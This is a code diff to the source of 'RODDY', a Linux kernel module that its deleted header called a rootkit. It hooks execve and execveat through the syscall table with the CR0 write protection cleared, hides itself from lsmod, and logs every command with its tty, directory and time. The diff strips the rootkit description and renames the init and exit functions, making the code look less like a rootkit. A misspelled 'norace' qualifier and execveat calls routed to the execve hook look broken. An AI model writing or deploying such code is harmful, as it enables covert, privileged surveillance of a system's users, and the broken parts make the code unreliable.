@@ -1,29 +1,3 @@
-
-/*
-
-Author: Trevohack 
-
-RODDY is a linux (ring0) level rootkit, designed to log commands run inside the system. 
-
-FEATURES
--------- 
-
---> Hides itself from `lsmod` output
---> All the commands run are logged in /var/log/cmd.log file. 
---> In general, the LKM hooks `execve` and `execveat` system calls to acheive this behavior. 
---> Logs tty, directory, time, binary and the full command run. 
-
-
-IMPORTANT
---------- 
-
---> RODDY is designed only for educational purposes. 
---> Use the tool safely.  
-
-*/
-
-
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/timekeeping.h>
@@ -56,11 +30,11 @@ IMPORTANT
 #include <linux/delay.h>  
 #include <linux/sched/signal.h> 
 #include <linux/spinlock.h>
-
+#include <linux/time64.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
-MODULE_DESCRIPTION("LKM Library: Log comands run on the system"); 
+MODULE_DESCRIPTION("LKM Library: Log commands run on the system"); 
 
 #define LOG_FILE "/var/log/cmd.log" 
 #define LOG_SIZE 4096
@@ -111,13 +85,19 @@ static void notrace get_tty_string(char *buf, size_t size) {
 
 static void notrace get_time_string(char *buf, size_t size) {
     struct timespec64 ts;
+    struct tm tm;
     ktime_get_real_ts64(&ts);
-    snprintf(buf, size, "[%llu.%09llu]", (unsigned long long)ts.tv_sec, (unsigned long long)ts.tv_nsec);
+    time64_to_tm(ts.tv_sec, 0, &tm);
+    snprintf(buf, size, "[%04ld-%02d-%02d %02d:%02d:%02d.%09llu]", 
+        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, 
+        tm.tm_hour, tm.tm_min, tm.tm_sec, 
+        (unsigned long long)ts.tv_nsec);
 }
 
 char *get_cwd_string(void) {
     char *buf = (char *)__get_free_page(GFP_KERNEL);
     char *cwd;
+
     struct path pwd;
 
     if (!buf)
@@ -302,44 +282,7 @@ notrace asmlinkage long hook_execve(const char __user *filename, const char __us
 }
 
 notrace asmlinkage long hook_execveat(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags) {
-    char *args, *cwd, *tty;
-
-    if (activate_autohide && !hidden) {
-        spin_lock(&hide_lock);
-        hideme();
-        hidden = 1;
-        spin_unlock(&hide_lock);
-    }
-
-    if (check_forbidden_command(filename, argv)) {
-        return 0; 
-    }
-
-
-    args = get_args_string(argv);
-    if (!args) return -ENOMEM;
-
-    cwd = get_cwd_string();
-    if (!cwd) {
-        kfree(args);
-        return -ENOMEM;
-    }
-
-    tty = kmalloc(65, GFP_KERNEL);
-    if (!tty) {
-        kfree(args);
-        kfree(cwd);
-        return -ENOMEM;
-    }
-
-    get_tty_string(tty, 64);
-    log_command(filename, args, cwd, tty);
-
-    kfree(args);
-    kfree(cwd);
-    kfree(tty);
-
-    return orig_execveat(dfd, filename, argv, envp, flags);
+    return hook_execve(filename, argv, envp);
 }
 
 static notrace void hideme(void) {
@@ -351,43 +294,47 @@ static notrace void hideme(void) {
 }
 
 
-notrace static int rootkit_init(void)
+
+static void notrace disable_write_protection(void) {
+    write_cr0(read_cr0() & (~0x00010000));
+}
+
+static void norace enable_write_protection(void) {
+    write_cr0(read_cr0() | 0x00010000);
+}
+
+notrace static int roddy_init(void)
 {
     sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
     if (!sys_call_table) {
         return -1;
     }
 
-    write_cr0(read_cr0() & (~0x00010000));
+    disable_write_protection();
 
     orig_execve = (void *)sys_call_table[__NR_execve];
     orig_execveat = (void *)sys_call_table[__NR_execveat];  
 
     sys_call_table[__NR_execve] = (unsigned long)hook_execve;
     sys_call_table[__NR_execveat] = (unsigned long)hook_execveat; 
-
-
-    write_cr0(read_cr0() | 0x00010000);
+    
+    enable_write_protection(); 
 
 
     return 0;
 }
 
-notrace static void rootkit_exit(void)
+notrace static void roddy_exit(void)
 {
 
-    write_cr0(read_cr0() & (~0x00010000));
+    disable_write_protection();
 
     sys_call_table[__NR_execve] = (unsigned long)orig_execve;
     sys_call_table[__NR_execveat] = (unsigned long)orig_execveat; 
 
-
-
-    write_cr0(read_cr0() | 0x00010000);
+    enable_write_protection(); 
 }
 
 
-
-
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+module_init(roddy_init);
+module_exit(roddy_exit);
